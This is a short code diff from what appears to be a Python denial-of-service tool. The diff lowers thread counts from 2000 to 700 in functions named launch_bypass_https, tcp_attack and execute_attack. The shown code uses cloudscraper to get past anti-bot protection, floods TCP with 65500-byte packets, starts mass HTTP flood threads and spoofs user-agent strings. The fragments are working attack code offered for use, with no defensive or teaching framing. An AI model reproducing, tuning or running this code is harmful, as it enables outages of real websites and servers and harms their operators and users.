@@ -44,7 +44,7 @@ def MyUser_Agent():
         "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/"
     ]
 
-def launch_bypass_https(url, duration, threads=2000):
+def launch_bypass_https(url, duration, threads=700):
     end_time = time.time() + duration
     def attack_thread():
         scraper = cloudscraper.create_scraper()
@@ -57,7 +57,7 @@ def launch_bypass_https(url, duration, threads=2000):
         Thread(target=attack_thread, daemon=True).start()
     time.sleep(duration)
 
-def tcp_attack(ip, port, duration, threads=2000, packet_size=65500):
+def tcp_attack(ip, port, duration, threads=700, packet_size=65500):
     end_time = time.time() + duration
     def attack_thread():
         while time.time() < end_time:
@@ -89,7 +89,7 @@ def execute_attack(method, ip, port, duration):
     
     if method_upper == "HTTP":
         threads_list = []
-        for _ in range(2000):
+        for _ in range(700):
             thd = Thread(target=moonHttp, args=(ip, port, duration), daemon=True)
             thd.start()
         time.sleep(duration)
